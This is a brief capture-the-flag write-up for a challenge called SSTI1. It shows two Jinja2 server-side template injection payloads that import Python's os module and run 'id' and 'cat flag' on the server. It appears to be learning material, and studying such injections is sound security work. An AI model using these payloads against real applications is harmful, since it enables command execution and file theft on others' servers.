# SSTI1

When I input `{ 7 * 7}`, the response is `49`.

I can execute commands with SSTI.
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

![ssti1_1](./ssti1_1.png)

I can read the flag.
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

## References
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
